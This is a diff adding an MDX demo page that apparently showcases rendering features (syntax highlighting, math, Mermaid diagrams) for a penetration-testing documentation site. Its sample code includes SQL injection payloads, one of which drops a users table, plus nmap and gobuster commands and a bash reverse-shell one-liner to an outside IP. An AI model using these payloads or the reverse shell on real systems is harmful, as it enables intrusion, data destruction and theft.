@@ -1,0 +1,186 @@
+---
+title: MDX Features Demo
+description: Demonstration of enhanced MDX features including syntax highlighting, math equations, and diagrams
+category: Methodology
+subcategory: Cheatsheet
+order: 99
+tags: ["cheatsheet", "demo"]
+---
+
+import Mermaid from '../../../../components/ui/Mermaid.astro';
+
+# MDX Features Demo
+
+This page demonstrates the enhanced MDX features available for documentation.
+
+## Syntax Highlighting
+
+Code blocks automatically get syntax highlighting with theme support (dark/light).
+
+### Python Example
+
+```python
+def exploit_sqli(url: str, payload: str) -> bool:
+    """
+    Attempts SQL injection on target URL.
+    """
+    import requests
+
+    response = requests.get(url, params={"id": payload})
+    if "error" in response.text.lower():
+        return False
+    return response.status_code == 200
+
+# Common SQLi payloads
+payloads = [
+    "' OR '1'='1",
+    "1; DROP TABLE users--",
+    "1' UNION SELECT NULL, username, password FROM users--"
+]
+```
+
+### Bash Commands
+
+```bash
+# Nmap scan for common services
+nmap -sC -sV -oN scan.txt 10.10.10.1
+
+# Gobuster directory enumeration
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Reverse shell one-liner
+bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
+```
+
+### JavaScript/TypeScript
+
+```typescript
+interface VulnerabilityReport {
+  id: string;
+  severity: 'critical' | 'high' | 'medium' | 'low';
+  description: string;
+  remediation: string;
+}
+
+async function scanTarget(host: string): Promise<VulnerabilityReport[]> {
+  const results: VulnerabilityReport[] = [];
+  // Scanning logic here
+  return results;
+}
+```
+
+## Math Equations
+
+Math equations are rendered using KaTeX.
+
+### Inline Math
+
+The probability of success after $n$ attempts is $P = 1 - (1-p)^n$ where $p$ is the probability of success per attempt.
+
+### Block Equations
+
+Shannon entropy for password strength:
+
+$$
+H = -\sum_{i=1}^{n} p_i \log_2(p_i)
+$$
+
+The time complexity of brute force is:
+
+$$
+T(n) = O(k^n)
+$$
+
+where $k$ is the keyspace size and $n$ is the key length.
+
+### Cryptography Example
+
+RSA encryption formula:
+
+$$
+c = m^e \mod n
+$$
+
+RSA decryption:
+
+$$
+m = c^d \mod n
+$$
+
+where $e$ is the public exponent, $d$ is the private exponent, and $n = p \times q$.
+
+## Mermaid Diagrams
+
+Diagrams are rendered using Mermaid with theme support.
+
+### Attack Flow Diagram
+
+<Mermaid chart={`
+graph TD
+    A[Reconnaissance] --> B[Scanning]
+    B --> C[Enumeration]
+    C --> D{Vulnerability Found?}
+    D -->|Yes| E[Exploitation]
+    D -->|No| B
+    E --> F[Post-Exploitation]
+    F --> G[Privilege Escalation]
+    G --> H[Lateral Movement]
+    H --> I[Data Exfiltration]
+`} />
+
+### Network Architecture
+
+<Mermaid chart={`
+graph LR
+    subgraph External
+        A[Attacker]
+    end
+
+    subgraph DMZ
+        B[Web Server]
+        C[Mail Server]
+    end
+
+    subgraph Internal
+        D[Database]
+        E[AD Controller]
+        F[File Server]
+    end
+
+    A -->|HTTP/HTTPS| B
+    A -->|SMTP| C
+    B -->|SQL| D
+    C -->|LDAP| E
+    E -->|SMB| F
+`} />
+
+### State Diagram
+
+<Mermaid chart={`
+stateDiagram-v2
+    [*] --> Idle
+    Idle --> Scanning: Start Scan
+    Scanning --> Analyzing: Data Collected
+    Analyzing --> Exploiting: Vuln Found
+    Analyzing --> Idle: No Vulns
+    Exploiting --> PostExploit: Success
+    Exploiting --> Scanning: Failed
+    PostExploit --> [*]: Complete
+`} />
+
+## Combined Example
+
+When calculating the probability of a successful attack chain with $n$ stages:
+
+$$
+P_{total} = \prod_{i=1}^{n} P_i
+$$
+
+<Mermaid chart={`
+graph LR
+    A[Stage 1<br/>P=0.8] --> B[Stage 2<br/>P=0.7]
+    B --> C[Stage 3<br/>P=0.9]
+    C --> D[Success<br/>P=0.504]
+`} />
+
+For the above example: $P_{total} = 0.8 \times 0.7 \times 0.9 = 0.504$
